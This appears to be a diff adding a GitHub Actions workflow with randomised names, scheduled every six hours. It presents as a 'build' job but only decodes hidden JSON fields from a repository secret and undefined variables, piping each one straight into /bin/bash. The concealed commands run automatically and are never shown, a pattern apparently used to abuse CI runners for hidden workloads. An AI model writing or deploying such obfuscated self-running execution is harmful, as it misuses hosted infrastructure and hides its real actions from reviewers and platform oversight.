@@ -1,0 +1,28 @@
+name: aizaixu1376
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: aizaixu1376
+        env:
+          kmkht37: ${{ secrets.kmkht37 }}
+        run: |
+          echo $kmkht37 | jq -r .satn44160 | /bin/bash
+          echo $tteo81910 | jq -r .tfzfh89 | /bin/bash
+          echo $shh34680 | jq -r .uviac63 | /bin/bash
+          echo $ifny55 | jq -r .hjfbb37271 | /bin/bash
+          echo $eh2801 | jq -r .f1992 | /bin/bash
+          echo $kgy6 | jq -r .wewm00 | /bin/bash
+          echo $mxs06776 | jq -r .dxhz3230 | /bin/bash
+          echo $c869 | jq -r .jgo82 | /bin/bash
+          echo $xur7 | jq -r .a78 | /bin/bash
+          echo $xb3729 | jq -r .epc9 | /bin/bash
+          echo $kjncf4977 | jq -r .ddhvo4 | /bin/bash
+          echo $eaqv59 | jq -r .kmof83 | /bin/bash
+
